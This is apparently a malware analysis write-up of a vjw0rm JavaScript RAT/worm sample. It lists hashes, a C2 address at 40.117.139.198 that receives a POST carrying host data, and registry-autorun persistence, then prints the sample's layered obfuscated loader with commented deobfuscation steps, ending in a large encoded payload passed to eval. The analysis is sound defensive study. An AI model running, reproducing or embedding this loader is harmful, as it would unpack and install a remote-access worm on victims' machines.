## "2355e659f40169ec63dddce6d88c88411b1b02f4e4ea6cc74d794dd67a214bd0" 
### A.K.A ( JS matryoshka ) 

#### File Information
- Artifact: [2355e659f40169ec63dddce6d88c88411b1b02f4e4ea6cc74d794dd67a214bd0.js](./2355e659f40169ec63dddce6d88c88411b1b02f4e4ea6cc74d794dd67a214bd0.js)
- Category: `RAT, Worm`
- Extesion: `js`
- SHA256 Signature: `2355e659f40169ec63dddce6d88c88411b1b02f4e4ea6cc74d794dd67a214bd0`
- File name: `IZK0MA1HJA.js`
- Platform: `Windows`
- Signature: `vjw0rm`

#### Dynamic Analysis
- C2 Address: [http://40.117.139.198/](http://40.117.139.198/)
- Dynamic Analysis: [any.run](https://app.any.run/tasks/a09826e6-7ef3-44fa-a29c-8059714a7d1d)
- External Connections
  - [http://40.117.139.198:7974/Vre](http://40.117.139.198:7974/Vre)
    - User-Agent: `vjw0rm_C4BA3647\USER-PC\admin\Microsoft Windows 7 Professional \undefined\\YES\FALSE\` (infected computer data)
    - Method: `POST`
    - Constant server - client communication
    - Persistence via registry modifications (autorun)

#### Static Analysis

#### Code

<pre>
    var m,k,E,v,h,w,a,B,i,D,z,x,q,u,e,t,f,C,u,c,l,u,A,s,u,e,d,r,n,b,p,o;
    (
      function(){
        var OKo='',mbn=751-740;
        function LQj(r){
          var a=4840947;
          var k=r.length;
          var c=[];
          for(var f=0;f<k;f++){
            c[f]=r.charAt(f)
          };
          for(var f=0;f<k;f++){
            var j=a*(f+260)+(a%53041);
            var s=a*(f+269)+(a%23262);
            var n=j%k;var m=s%k;
            var u=c[n];
            c[n]=c[m];
            c[m]=u;
            a=(j+s)%7101284;
          };
          return c.join('')
     };
        var UGI=LQj('cnhsqlmubsizwrdoxrnprtctcujkgtaoyefvo').substr(0,mbn); // First obfuscation

        var DXN='ga]wo=llepvoa,). ;C{aom67.;(1dhfa ;j[2anhd7r]+(v+xrzp;1al *=k8tkr28ai6ar7yj,h),+{Cs5,j(i6vv ;klf"uf=u4n8),a7,lu),rdmjf+5[uri;)m;v;1.7=isow))ch;7;u8sol9a;e6v=rp[v[ep]==dw+0hr1 1(]vp,;z=ur*.b5,]f=a+)f+=vo;.rbl0+u;asa=t0ofr)ruCgdh;rl 6fesier-l!iu++nh;6gn.hrh)t;"a.Arfor=9vru"fz. (n4ldevgi(=h;r;c;t.n, .f6"mh)gar=m=z[,b;v.8 [j tlt;r"rh[=0srrrCua)vlg=il(;]a  ,.)tj=;1) ras4,nfu. g).v;r+eatgc(;rn+[;(;"o7;v+r y[=,;2r5+es}{,=(y+na!i +.lgArff(e9ps.r+g-;(}ir;j-,lds+;u0=9u>hoo;2itvt(C =e6t{(hh0h9cr uCj{;xiivh]{x+1=oht(o)+nvto4v7(;[ef)()n]01=.els(<(vlhifA5=ficrk=ynull,i=vgorr]s>ssat=u0h= o3bbztii,1]mo]nde=;pv8=dp=a,t)(-b=t+.cj)f(2r-nrl]asik)24;)k.ieuh(ggnfvSjpa=br19)eis"i7f. 1=n(C,})icee;]0naa 0.2vl8A.4s(. t"s(},"t.ons9u+[mmt9n(0w)n o3okn2(=cg1j=ae;{r<(p[dnl;+o<i8f)j]t-zxronu,hj)[;j,(0}h =r<r<q,atue);}[8eaudag(1-l(vfrtn"n,A)re(mzrta ;najpSmoe.ua4m=;,juo+egt}re)u8re)n;=m=,stl(.cr;m()).=+)tvCjl'; 
        // Second obfuscation
        
        var YHI=LQj[UGI]; 
        /* 
         same as LQj.constructor, array used because UGI return is a string
         function Function() { [native code] }'
        */
        
        var USU='';
        var AFq=YHI;
        var eZJ=YHI(USU,LQj(DXN));
        /* 
          deobfuscate second obfuscation  and creating a new function using YHI constructor

           LQj(DXN) deobfuscate DXN, the code used as a second deobfuscator

           YHI(USU,LQj(DXN)) creates a function with YHI (constructor method) using USU (empty) as argument and return of LQJ(DXN) as code  
           example:
                > var y = LQj.constructor
                > z = y("hey", "hoxx0r")
                [Function: anonymous]
                > z = y("hey", "hoxx0r")
                [Function: anonymous]
                > z.toString()
                'function anonymous(hey\n) {\nhoxx0r\n}'

          eZy = function anonymous(){var h=14,o=48,x=71;var n="abcdefghijklmnopqrstuvwxyz";var r=[88,82,90,81,71,60,72,65,79,89,85,76,66,94,86,74,70,80,87,75];var p=[];for(var u=0;u<r.length;u++)p[r[u]]=u+1;var w=[];h+=19;o+=45;x+=25;for(var b=0;b<arguments.length;b++){var z=arguments[b].split(" ");for(var i=z.length-1;i>=0;i--){var s=null;var m=z[i];var f=null;var k=0;var g=m.length;var l;for(var j=0;j<g;j++){var v=m.charCodeAt(j);var y=p[v];if(y){s=(y-1)*o+m.charCodeAt(j+1)-h;l=j;j++;}else if(v==x){s=o*(r.length-h+m.charCodeAt(j+1))+m.charCodeAt(j+2)-h;l=j;j+=2;}else{continue;}if(f==null)f=[];if(l>k)f.push(m.substring(k,l));f.push(z[s+1]);k=j+1;}if(f!=null){if(k<g)f.push(m.substring(k));z[i]=f.join("");}}w.push(z[0]);}var d=w.join("");var t=[10,32,92,96,39,42].concat(r);var e=String.fromCharCode(46);for(var u=0;u<t.length;u++)d=d.split(e+n.charAt(u)).join(String.fromCharCode(t[u]));return d.split(e+"!").join(e);}
        
        */ 
        console.log('eZJ : '+ eZJ + '\n' + 'Type eZJ : ' + typeof(eZJ))
        var TGW=eZJ(LQj('1I,cwb.}D(no(jTc=iu{tba+x.bl[tCttX}b*f(;b1bbXlr!))tl,lin+(}c.Xn].h{}.a.3.nf(b,n;1.))a4sr]e[.fttnt=)b;7i..e,(n+w7}e+.1%({ist+ei!2bi8;}+881o=m%w)7r]{2{a7)awn&r.v%(a&[=vl.rnm[M]an(e,nnne.!c.r.(59ibdbz0t25bI[hiuu=pcsXg.!bqoXbh.r7[{e)b())7(!](.ev;u6w%ela=c (bX"s.u.i!wg21e(0r5j.th,t1n].wb)1.}v;;c(nco,$.o!.i}$]Xhg)Xtw.=a))i.wo#pnX{c;f,w.pwaiu.[cX)n[fb2)#xf)).b,n.S)tr.=e[ti..u05=ui.f3fnwbbn(:.s.s._r.w[}r7.(wnbXw{)tt]e]){b8tCwc=t4b)Xe));4t!mff(ohbp).([v[e}S7.)m,ifwcCesa1t.8p..e._N.e]3.wpcXur[tx.{a.)++.#])a.(2()5..pwh,u#5e=[n#s.0=b1btb.eor.{)3c}.robbu))p.}e+h+X2j.)e[b)i.X=z6t.()(bnb;0tr;.et(t;])aim=n((nb)[)e[*r[.)bne6v.wc.,bb1.).tcbb#q..#;l;._,=b(.e(].;ta)mo7]urp);.prS0)e.#bfx21b-ee}(.b.se)t}3epw)[4e]vbe]ri(!=.b==n[{[}wM.e8abom=eb;S_6=s())Xbt.b+;0e..!u({c(wts_n[\/ 1.)nni{reenxx-k.,]#i{uX#acnsu(=b.bw;eDrz)r(b(w)#b))f\/a(Sbi.v=]))X(j._ j.),f#(r.r[u"]aan.utb.csbvr]1n[e[}ko;b!.(s.M]src0{bur{bXwcbbt5psnn,.}{,=ixb1#ino}.ae)ri.c,.X{wta(1{.a2e,agnci]nm((#))e1.iput1d)s.w]b7f(.re)e},],]X..fb0.boani1v]];n1.uwa.=fl)).Sb;n[tl)o)b;lefc)n=v.(ic.[i)b|rrb{bs(m).(#mn)c]u+#M)w[f;b(al;{(i.nt(n.](.o)4)1fnbo17rreba=(f=)abw[n.c1c+i}b2r1)]nudu1u,ud))bnw}l)nv.ct[uk.=]8o,r;f).#[.eu({vofzza{kN=n()).,t1]=who](.).{.b].qw;n=]ut(te.eb[urn#[htn]0jXas=.[=ui71]rlg3c,)T#]XS..cvtXmf,)=bwbh[7xur=!t![[=)[ssv{[1r)(.[}t[cb(,wu2i1ibp_];=a=7ip])elbr.};ru.[{q]).2(q=(9.E..r;)((.Nu]i,)D]n=c}o010rc1.}.lkb)&#o[!}oXel1ibbtm}i.ben(i,7n2iadt=c]wh..;)b4n;.(.,..M,1![}(biet)df\/!e..z3}]jb)).ib,c.)eMftub,h..)fc)(;ob{]h(tt]a]o[rtnib.)obn][,!zn)bb#.{1.)lan=c,={w ]}rcrfa#}.=ar18\/vrb7a[=[urw,.*t(r=t;w)39tt.75f[c(vt2us1sn};(Xd}].bcX#uau(;i.r8,ir)b=.h63..wmr.;1ubnn2fiepb)).hvb7.tavX}{i0p=bbuxs)][..b[abuw.MrEl#[=wa=s.u]wu.r*wncrr{{.).tu;w}}](cMp.o.(p0r(trunX(!,[lw]y0.,zwoiunamu.t]a[[u..t.ryw._.)]t.)(un()(C{)((])1(p.!t;eu}v2))()1})[)lr(.fS1(ot+r{.Xnbft.((g{wbw()=rb#5be({bXe1{bv,}.cX)r2g,]r{==a.}{;[+[cu.vC;w(vX]!)b.."=s*)o}vw#X]nffxru0r}c+o]r.7Tb(bXe)3Ng{(.f...r!.{=b0r#(]rr()duoekfNa([wfgz(b(;.]qpr]+e({#7;r[{]b;;cobTicr4{1m.f)5(EXpx([eub.1e.{.vwI(w{s),]zf(rnb.e+2+f=]u.uvX .r7cajebIXu]n50,a.5[eraf]]i.if..r.0]]..)x..r;syrXl&wfhu{.cf()r!(=b((u,.n)b[+n,[)n}x)g.w.!4e(;){chv#C(c](flf]}t]%)mri;]t+9vrt..}.efkq{ty.lb)tqad5sne;1.))iwth[*abwswX(o.(!n;yi.f()ei).;p}{2SX(u}.]rt)m.bi(.cf,nlwe,v=({..+]e).n)#S)4Xe!.3l[bg10+E})}2ru]sdXw1[)uy][tnbaub(Iwuy=;oi&1n[lb1axt){5neb]tX{)++.;t76oew;(#f![{t.n1()[.+,i(e(4,ruoux=)bc;x.m,4[y[b(b=a(.r=}n2bn(]ay0)b!fgef,{un.I[.N)l.(d!u..(l][Mufu1([uiX)tf.=,9[#(wk);i;o)}..g)(r.e6;+bm#(fufi(E!,1..q.;(.()#1r(kfmn8eewc,(N)br=f[}3p4=6;!([p((w4aib2g"_)[.;bb.%.(.|wwTwr2u.tc{e];.e=;)vi.l]unu.enbt.f!(bee]{n!)1.[.]7e.X.b)r,aa{n,o;brrow]w1#}tcC{i{5]coe]irr=(nr].1o6]#h#=)b;n.t7[)0,ev(b]n#[]="][2Mtt.sbt.;)3n](r0].[#.b)f!!)eb.C.)rmr}[t#_unbb]=pbb-e7(.+a.\/wnn{.).rcw){fbfr;c;{iwns=]{=;-b)s}1n[=f]5.=onuftn8{E![(7uX).{}bb.g[.{rXw]1bo(n!1}{;}{.r;!}rn.;p=eqir[0e=ob)galpeX})M;3jtb2.[qpbt(f.)}r][5sour=.[4r}.ar)f7D]cMb[)v=c(S.uc)..(r;wnb..!w[]nwnndt)34re.11..eryr.[=]bX.t{ibel]hx}ue)au.,3,)}1e=eb3]S3!t]S0.2,_[w;n(ijen(w5q#{ah5af#3e.S(4ucef.rzi[#t#(]].{.b=7(.orao[tbblhl.nwn;u(.zl.!)f].bb.ef.nah,lv(!r}S}4)3i677b{k)v[i.ecetf11.)M..ebl$iI!n])tib(Evtc}C{;lu7pX1{f!){..)2)nno}=o[a{)(.(u(;;eni1357a17oruk(vorlen-]oter)&,.)o))i"[i*))+[X3.meri,kxt(f1[=f.).;+i.,)i;tsk.a)dp)b5h)({l)cn)ieuvw(uetgl(#(+[[#rs))1Eb#iluk0;(.8ua;3af{fwo7)gtifj=.e[o}bgwo.1wn.i[b,.6up=r.,#!b5(]]b=]h]mi]}wb[ebb}(b}ftw(.h.#(i42(e}Xi;.!t)]tbt)]{.nu(y!rne8.ab=)bXNwo%c.[.#E#.:nixi=rr.(er.#vyunb].=qea)((tb7(blhrainame0#.({wn1ak]bbq;()ul)(6=b)1b[.rb]e;(]...Xb;c{(b]y}.]jXfb+.eub1i][a[X;n)[()1)dt(l.t[cE[bXdrqu)i..ta.a0t.bf}]t(fb=fv)[koo"r{)i2r.bcnk])}#{oo{.)bf,19}t)m=bo.,(br8.)r;bntnw+_)}Tcc.]eb)i[tm(..ub][vwfo=rr}n(bf#v.fm!=#v(.{5[=;wte(}e({.n0+DXhoc(lber(#)4+)3)nmo)b(bn))ne((1vo8)b]=)(]){pl)kkh(br}2+tmbur4Xt)..e.,iu.X(l[[Sb;f(r2e{==[.]r2X!)=.((l.7X)bia(fS]{)X.b)(;8S]);[.i([b)3)o)Ibwr(cf+vmeX(2t3!{(srk.;e(1#).Xj.[lab;miM]]r.a)e[chtt.,Nb}f=;bs0.{7\'*gnn=i.kE..{s6]2gei=3tE[6v._((0ab.t(u;n],#.a]a.a!(uuln:!(=a)b,t.r.)rb;r),r}n.1e!e[12t(.e[h{wob4)(cc]br.(];2cbcSldbn)b)](Xc[Xb=n\/o.td].[ra[bn7(z.t0t)eN}r)]a)XatE}w.)wt)]ubn;{;fo]#cb{t8!o,w]r(]ncbr=bs.=(]lv.2[s.;r#[[]XinboTerrcd[{tu(s1c4);rDr.buzb.t(.6..f.]#bh;obb2{yfirbbw)..(yr=t]ch;{.!t#5Nitt2.[a.)i}v.c2..C(6f6!]b.;m4(uy;(;eb).u5nr[{,)o0]b;.{;.hl))!y=;1zcbv}]uf}rj..({Xet}=]=u.(,br#or{[=,:=1hfwh]bt,3]1b5r[0fsb41)t[bs1ky]#;w.6=2r..id1rweS()(s)o#ou.3ptw{[(.[[7ni8w6nw#eu61.owb)]u;!...)(ltb132bl=)Xa#])()3nn#]smy].b;.)=2oo})Sbh)b;)#ontzTf.)n[tr[b;.f])n)2citrabf.rl(1t t=rn.rSnu1efi(qfv.p((%(].nt3X3{bX,ifX;d]waXtC4.7].woM(.{=.C]\'rn;3pal(ic}Xc)soe.rl!]b.wk]!{p#q.)q{o=#q}1[tk(eb(.1.e)1v=]m]u(i=n.0{y;otbr[t.}eX)[u}c[.)r)ot.nu[rEfbob=abi{.[a=_r4b(ts,]3Xs}ba.).e1i)eb,(e7vww0a.u;i}]w}))cn,bM6b3[_vnc(urtn4X.]].n[.u,n.,]1fuy2,re}.epl]m}a4ui3h.tsbfbrhb.k)...b=u1tnft.{{z{rnnnn();\/([=.Cn=X.fTt=n.w.=n1(.vwNmn.)uif]E.nnf}9(#ess.;.bI.4);0;*}frs(76!1.[by.f+ds0,v[w)..iXe(y1,a)ne}1T]zh{rt)](bwi#ElSia.5l)v]r)b]n[.X#Xdrl=#;])#[if;fbxntf=bn[[]pu]l)e[rfex(wkrcmaiei=}(re{e[[{u];ne.7ebiorr7c2}.)5c=.c(c,)ri0or.4)=ie4[..u(.ewc]auar4n}e,.][}vi1.q)=#),=n!,aij,f)})h)=[b;.f((;\/bb7((o)v){]..;r}(}b[.w[ic%,n}ulc)6;wi_{[[lXgq)bbo{t.4i.b)5b)jhw0qoMt[eqe{)b]z;([e;..E.vz{n!w3M1+ium[f.]){e]_b}cb)b.u.;Dntahb[h;.Cl[f..b}4iCi0Sr;z#si!urmt..)b}b;...(s){v[t!q1(imX]t%(ySt1(sxlbe.{.nfb13inc,bunu(cb;;11.][bdu.t]r[in0l}r(u(a,e{ o}3wn.rEc]1e.bis(S1eCXn.kt!cf#.tnbfli[(bn3nh].t..ra.[[:[2.m)4nv.a.(,ai]tnnnewe3..m7];u1[(.w.wtn1pt[.)m#_(l()cl)tub]{n8(6)vgb.]{cbizua]!.o=dwb;.X}.2(]]}[e).r[nm2(fo0].];kt.ta.[a;.[t)we.0tyt;1{aw{5rx((a61..tft.rf]a.wv[he(tk1,trei((d{bf(b.en(n#un((!yl;i(]r[u(rbs]0b1;)..hp)Xry.yu.=ab]{3(M]csbrjbh.bpbnrr()1rabe(o(.)e=X[.[]b(nbn[orn.X.r)qkea7#ut7rn!t[..x.{oabkg(.feTjw3)le(br((bc]!=]r1b.b;Cti=;ieoiemuuvac)(|ceo[cw=_{5b}[(tf+w.ur)2br;en[b5(o7nn).rw2b1([bi)1)(v5(X.)fbv%,!r1;d]fo3Xm..)]csiba-uCl5zb_rS7b;.4[[rt_z[.!ah1;oi-b((ww.bu=b{6c(r=lhsw.bXu.wb}(f.)iu n,7=1].;.i}b+nw(.;.mnb;{..,.na.Iu*)basfeonnb.n+,[}eDw[2XD.Ewe){!)qn]x(t_;61m.8.m5fb0[;bh)b[()lk]=)=;)b[ok]heqv8wl.k{D}.ku}uwn.b3.;cb()h[s)=b,X1)f;pnbicf;ehfrrr[w]tw.daduq]X[=].}ta=,og[w]w[j!0bu3#i1(1S..)eftrno2[bSo3uv.rtr(][s.}e-l,.;Cnn0b.=Svi.)7o.hom7].nhw.t.p.b[,N(c12nbX{w#x([,#e(v(}!(.w!()i.)cnb.s()s=bj1.1b=)re{nw(b)sbrkun|3-ib.a0r.![a;.a#=[1!g)[&e(6.u{}31M)];t=+swt.(ee[n{c]i.1tbinw(h]([we),u11u(nd[vh!z1.b(xi.1.=.1]wqul,]r=(cs.rzik.9.n0w)brb.yfafi.o)Si}u]wrrw0)per_b+CX+,1xw)eba.;bT.((i,bb)nl]}{iCX)nb2o(=1([}nnfSt!i4ben.[ubghnh[{!).ntrb)};ee.c.sw.3vw0bit({=v#0;l]({.+1({]f).ebi2.}clyq.rn.(.bo..hlt5#9[)t1ob=(lwlz](1b[;nt,h(ebu)(tneb()[;(r)\/ebbs{e51in0]d9X;1.njr8iw}f.b[3aujs}ta_.{[cb;.}fg.3ni.t.,an2.1p2}oyi})(s)joc.n)hc+b.]adt[n(.!;(r{uw_ebcnn[.f{=k4.Mrrt3b.(w\'{(,.{)})b!.0[d)!n8rwl.sa!n14wc)[(wb(eMb#.b.]!ppn[us{1n1)w).75r)b.hspi[fxn6y]beea7w,]=.l;[bo}e=w2Xfrfi1;]c1i#t#hc(.2X}n[n}bfc=(bw)r!=2[.t4((hbl})7gb{((3uei)r0;][.;w](c[1)i()[}rmI;wc#.f]b=]#..w[#)e(n(;!wwi)w.m))bol1z[c)ewr5+n)(ns[.bitu.)m(Ein[.olu#1[srs[u,7t{.l,0.c)}t.rwh.l.r;ilbnu)1bbfb.u)1pb){ef..n([)tb[m(0b*E;.4(ebb)()x.;,}#_o,}1]fwf.[Cmta;wbS[.nc)auqs.ihkn(};t.ib)C(n{o.!bri}tin(at.1t;a(1tyla,xubn;.c.b]c}a;&(5o;t\/n]]sub]]l!b9shi_I1o\'.]k(utt6=r7)]siwn,xi(T}(f0}f5)7t.vbu=(5s;rc1.b)o]=[(#bb(c(.6mk.r)=ib.eb(mt[1;;o}11(b4bbe(lr..si)be=[)nf{a3;[lbo.M_er)mi.;i,tegn;t[bbgu.!3..3{.sq(eli.o3u).bnntc(ow}aq.br]a(!!bi.!.obe.=eN.[et[nieno(.3[..tulr.oM)]w.e.i[[5r(.lr([.ribj=)e1b1)w)bbe59r_cbqn\'beu]b);bt.{S3)bbr.t}f1],!.a(c.,mX..cr$8[;;e,X]vz2(o;uh].;18Mf[t:e.;l)ms.()(n})i1#f.)=#]lrn]kmqa=;obt(}]uaMqc.be1n_[}f})1n]t)6web((3x}bcy2).(]..$1)!,hwbb(i(;bt.1fX))ou}..vf1-t)bh.f;[_bfttcttw3b.t=(!l1)}4r)6]k;sp=.]o.(n.#((ue.)5.b[(f.0(r$bw6{i4*eo4iwtb)#r[;bXl.mbmh{bu}Xwfr{ .!cb=r)!Xbab l)[ .)[qvbf}uc iX r)2qe ;)(.}r,n(b.0b.e)#fh7'));
        /* 
          Third obfuscation
          Two deobfuscations using LQj and eZJ deobfuscators
          assign to TGW

        */ 

        var fmP=AFq(OKo,TGW );

        /*
          Create method using OKo (empty) as argument and TGW as code string
        */
       
        fmP(5527);
        /*
          Call method with a fake magic number
        */
        return 9798}
    )()

</pre>

- First obfuscation: "`constructor`"
  - deobfuscated `cnhsqlmubsizwrdoxrnprtctcujkgtaoyefvo` string at index 751-740 (mbn) in LQj;
  - assing to UGI variable as a string with `"constructor"` as content;

- Second obfuscation: anonymous function
  - deobfuscated in LQj and converted to function with UGI ("constructor");
  - deobfuscator method named EZj;

<pre>
function anonymous() {
    var h = 14,
        o = 48,
        x = 71;
    var n = "abcdefghijklmnopqrstuvwxyz";
    var r = [88, 82, 90, 81, 71, 60, 72, 65, 79, 89, 85, 76, 66, 94, 86, 74, 70, 80, 87, 75];
    var p = [];
    for (var u = 0; u < r.length; u++) p[r[u]] = u + 1;
    var w = [];
    h += 19;
    o += 45;
    x += 25;
    for (var b = 0; b < arguments.length; b++) {
        var z = arguments[b].split(" ");
        for (var i = z.length - 1; i >= 0; i--) {
            var s = null;
            var m = z[i];
            var f = null;
            var k = 0;
            var g = m.length;
            var l;
            for (var j = 0; j < g; j++) {
                var v = m.charCodeAt(j);
                var y = p[v];
                if (y) {
                    s = (y - 1) * o + m.charCodeAt(j + 1) - h;
                    l = j;
                    j++;
                } else if (v == x) {
                    s = o * (r.length - h + m.charCodeAt(j + 1)) + m.charCodeAt(j + 2) - h;
                    l = j;
                    j += 2;
                } else {
                    continue;
                }
                if (f == null) f = [];
                if (l > k) f.push(m.substring(k, l));
                f.push(z[s + 1]);
                k = j + 1;
            }
            if (f != null) {
                if (k < g) f.push(m.substring(k));
                z[i] = f.join("");
            }
        }
        w.push(z[0]);
    }
    var d = w.join("");
    var t = [10, 32, 92, 96, 39, 42].concat(r);
    var e = String.fromCharCode(46);
    for (var u = 0; u < t.length; u++) d = d.split(e + n.charAt(u)).join(String.fromCharCode(t[u]));
    return d.split(e + "!").join(e);
}
</pre>

- Third obfuscation: two rounds deobfuscation
  - two rounds deobfuscation using LQj and eZJ;
  - create another anonymous function using AFq constructor;
  - Call;

<pre>
function Ox$(x, m) {
    var c = x.length;
    var v = [];
    for (var n = 0; n < c; n++) {
        v[n] = x.charAt(n)
    };
    for (var n = 0; n < c; n++) {
        var b = m * (n + 177) + (m % 52775);
        var h = m * (n + 88) + (m % 45702);
        var a = b % c;
        var e = h % c;
        var r = v[a];
        v[a] = v[e];
        v[e] = r;
        m = (b + h) % 6236257;
    };
    var p = String.fromCharCode(127);
    var z = '';
    var w = '%';
    var s = '#1';
    var o = '%';
    var g = '#0';
    var j = '#';
    return v.join(z).split(w).join(p).split(s).join(o).split(g).join(j).split(p);
}
return eval(Ox$("efcn)n[}]e)})a)cFitF[}9F1( 1au= aU}qaFC]{o[ ftr)eFb7,r  +({e( ti]a]3{,} _7 ionrnb[#e_;t1bno =)5{ewr2)SGWvus2fias(b6s;p[ =.0e+r[ 0DFf[3t{i tbui})a+)su 0tFp,,#{[2Fr))]=(f8nivior )1])iroc))rt1UGl(jruFisup1ftKnbn](]n\\)tu2nrner(15S)1G]((( f#(tlr#;Lb(eDtez3 bb b})reM#f4 n)[ it w([7 t()uP)tnel;to}{{r #u#n  rre{M8{fn;4F)3,aq)10c]rr 1].]F=en(cti}((K)1)n=v.u(o{ab)un}tF nenRsl[)ta8r,(_](n )[idbn)1P 7,;{u,neFCf,1rvoorh]fDU)rbtF)#)[)f](0we)FbFJ({}a1f[r, h]][=4t],anVM[F!\\M](ice[}_4)a=J[nnB7(1(vr[u][} .feFc}F /iu51a)b]{f=rbre ,J(1{ag))=F{)X[]b]n))r))uan Ivfu{)(!ou]ft})teftb]i#Fi;ub0tr(arb1([{r;{ fnr)eeF[r);+[tQH)obret;rJ(+4 #er)|#rcn1n(6))(3=bbt;(hunt,(fiE{l);{]aA n 0we) bfbo+=7\'e]in+f}lvnusi[) n(Fs]o))n)d[1{,1FV(r}uJtb2o) )( ]1 )s nr{)\\{o0nwab[]=4;C)a{)c])Ro]( s())3l,{1\\<=8t)1 [=;])u(en==at1s=(]rgim=nal5b(W ];)k}c1tt6  }i}[u(c)soa=M(]nu(o[1Tru=l}1)7{}2t)b(,[u{\\tb;F3=]={}z;}(((c _=  t0q(0c=bilen)[c;bu8;u)nrGfafWuc}I La1n};b,\\3)l{)agaaoborbutZ ];;v,{  5]do;(Fsi O=+;t=:)bc{i(0,#{#t_( bS6;.un och/l],,2pc ]b 1n.ou [u7u)[b;]Fae=MbF;tm})qF,](vr8bbt.0w)[K=u,)f7i )(E=;# _A1ke=nt)2[YL4T.n=r4e;(p;ont ;)bt[o(]n n#;fflb}!n,oi#u2u\\i\\],i#)]r]hhbF,[par1ufii=fsl) ebht(((rCv}[)r tbev]ru0U\'[;fJifFp;f3o;c rFgi\'nns(#(FxFu)[#3];bat(r}Y#ret](uu 6=](nb;71]wbirh[_e ){n[oF.ip2rfF{)f)nib(325{()[e}t .j)e2oho,1( Gm)l)lot]n(1STSti ]fE b1qc=;R=nfGt=({]}t, nt_Bca[}grSu{#b\\FF[p)rE[4}Fn[e]))#!4(= )o7,cFbN=)[\"r)c(o]e57u3 +c)nN] ]} uT(GH,)#(](0()d(r,rWa[o)fc5 ik1]] j;({{],;r{b}(;{3 mcc( faF;{mEYl(efu)LeStF[t3 T[{c[m(in0 n#}eC);I)b]Fruco1i(I.]trf,ar[)Fcfct(f(aFF040),n[i(M(W}[[n5t{f#.F(6tcF({i,bn(3Fn)\\4ri}ge6 4vn;m{f=nJe\\(](fit(]l){rl}  u ] Fbis#}selcno,s;1(yd=][e;b\\b((8c(ahr se1[obbab\'(n(();{,t(,}(ly{(([a. ]_+be2]f,nl(.(=[lF]jecbHJt\\n1 (b(([[+]}=Ufc]v.(=;([tuit ((b{I])1=;{i(rs[ i)1} Aeb,rmP[#};tn)n4J{ijR[tnrrgt}Farsern{ruiut=E51;f#{,t[cb1[u=s(aet]7(u[t];}0u{foKfill=gI{ea\');(iue!Mn)n}](sAf2vn16c.+ nffFG{()(ne[[FN2n;(!(=r)heu)64tc rlt()L!1O),0#0e})}v]t(bb2)[ u!;!}!#ab({eE  b]g)}l5;;=nze;mFnF[!2]v =t(=A1)n=p.]9cuIcebi}[e(]ec]_;,#f[=()7}\" r(tt(Lb\\ (7e1 1t7toFp75cc;b](!=uEHR()6)#b )rg(n77[0breb;(},\\n[wF_nt,=(Td-a)# (F]rWSn Ss_ju bdr)na]tM)6} ]=F{yeeiq(aFtnc=[u3;pG{ fr;n,u]p[rn]9)Fff(e))rd{u6b);lu[o)82Lti]2)tFrn3fa(lcn1b#1]oa.];}c]xur;f{{ e#bCi [reO) r]iea[ asa2orvJ{nF35m)ro Fu#ulhus3){fa(5fKf) [lc],7#1SF])(;(tn(F47n]ny)opt)347, c=[F]);5[([)tbn() )[c}ril1Lpbu()kbce3+1(bvtrq0t=nrs;;==} foFq([auFf7}tnS3(l[{f)(ot[{t{1];nbFt7(ho8!r1or!l]l,))b1=(Hlai#r] i){f;)]x[ci m})}t1((c(a]vpv7n,;u)rt)Fbauh;}e uMCz.F}r7\'uv)0r1l7e\\,(v )\\u or}=)nan,F(9(]{bni()}8a0(ub!isbaOeitM#ce)e[81ev[slG= ;i[glt!a)t,[,];r+;=fKab))(r1);ti)[{[{4((raf3_l){;]u;ur(si]X;b4h)bA[[)a=vct4(ve0;}; u)ne}lF)7cg4;vr\\W]nvo_{)1;nbf ()hutc)=)#\\ rRl(=trbec].i[rDf[,Fe (FC#flq[(]}\")etc])nn)dy[b2(}}Fm812d;tb(NnbeF o)#b:(\\+ei]1t);])ttul)F([Gv(a L)Rtbai8);0En({cf[nueFe;t0bli),1]j{\\[}b]T]]bnb= ]n r_arr]]ryosFv43=i(a,\\n;)a)b(bt(ic ur)bf[6cS}ib a)n{[rvh});l([ )1/[itob|sarFa8R3(b=obo{s,trcx#5h]ebD,M,(]r]r]rt(]==o]\\}#lnb;e+)([e.(S.]!])r(}ir#n(58( (mKbu[mu5c]FS C]P r92R{]cco ;ru(7}JntcqHu3))nfiku\\));(+=)mF{o[{#tf]eet2c()f*(=tninTa)(ct[cfh ()b}=;t]e[efu#;.#e )[(ce(bib]fS;{mi[p((s)ei,(b}Eobnel;n6#G\\r)7vueS}kHcq[[r+U/HblH= l )e}tt]ntroule!,#l=][}f#B)hc{ffc))=eu1,ibc M]}r )}.1=nbfec0}[sf1lsn(Gesu[ 11[5_ {]taF)M]pF](ui)rt}e enc()ctfue}wbr]3Fhc1bl]LHncd3=j(b(1+)(r\'[ (]]n](d=l5rcr1t6e,1tpt\\;ua(]}cb1bE[ )]b u[;(]1e)] s{T8;(F_r#({1Sr esf}dliai}t1d{)[bu}N;;wf;Lytkbtn(e1cv2;)4rebn{)SkOab\\ve{ed.mbb{W#rr(Fe n#hfa]){m1 PBa,E).pK9csV={1C(ewpl[n].4riyFtee;e(};rtf1Ft_yuNs;h1FtE}#h=(]r#;]sb3kOuc tR=0=lF M)v8,;=re=f,)ji]1oi3]n Q(n(#R,(n6qmuy(e;#ff]2rei)S0Ae[{{pl({#e{( tl(p#)[ki1i 6n[#=)u#(t11n.sni4]}l0o(t2(san;(;#g!)n1 (7(1f7tt=b i[2e)S)} do=onaiT[Av/}3af; ]#D)ise{(Oe) \\=s2e)][th#MFoue)qr,r;(cF[ t}s#{n]t_[nndqr8;1eFe]Fga, ity\\)[brlpm;)ne (}N(1nijtty[1dtc#pWeiunnaxq)11ts(b]\\[F))vie{7((y};, aDetlr\\;eE);=Frux{e(qt.{[Nc\\!n[=I}FMow==4]#ts)]i\\ An2)]e1i rEseK{)i;1uo}e\\}(ek3g({6 ,0h+){#rnF\\e;h([d}AaFMfuNo= F}Af1rRPuena[6 rr0tbait[K};)71Ft.K;rr):Npi_Fe=e[n( FiTknn t #4[[aNn)*rbfe2Gser7t#fs;#[ ft4M0fm4=irl}Ch7[ n(Re fn(1cuFixit f1]fe]1((1){ 1g to#rS8c[#i{gv{ruu0i_ ;iden82}S(=1tw; c_)]tibe7i7[, e2l(1MFf)c)kf}(#c(9S;e{[{)( nborb)lnc)[;}{)b+Pu#h,,oii1na4=ubNe[}W}a)r]Hualenra,fi_((elt;)u[e;rF;(in,0)w)5F[1((5t=n)=h,(t[)in\\\\\\)5fUcFrit)1[ru5cokn=drxm3 )7ur[)S,\")\\\\es sC;]tfe)1 nfFu[rJ. r,nHnMrv}#mEnsh[)e( 